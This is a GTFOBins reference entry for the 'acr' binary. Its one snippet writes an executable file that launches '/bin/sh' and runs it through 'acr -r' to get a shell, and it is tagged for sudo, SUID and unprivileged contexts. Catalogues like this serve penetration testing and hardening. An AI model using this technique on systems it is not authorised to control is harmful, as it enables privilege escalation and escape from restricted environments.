{"title": "acr", "source": "gtfobins", "source_label": "GTFOBins", "path": "acr", "html": "<h1>acr</h1>\n<h2>Command Execution</h2>\n<pre><code class=\"language-bash\">echo -e &#x27;x:\\n\\t/bin/sh 1&gt;&amp;0 2&gt;&amp;0&#x27; &gt;/path/to/temp-file\nchmod +x /path/to/temp-file\nacr -r ./relative/path/to/temp-file</code></pre>", "excerpt": "acr Command Execution echo -e &#x27;x:\\n\\t/bin/sh 1&gt;&amp;0 2&gt;&amp;0&#x27; &gt;/path/to/temp-file chmod +x /path/to/temp-file acr -r ./relative/path/to/temp-file", "tags": ["func:command", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}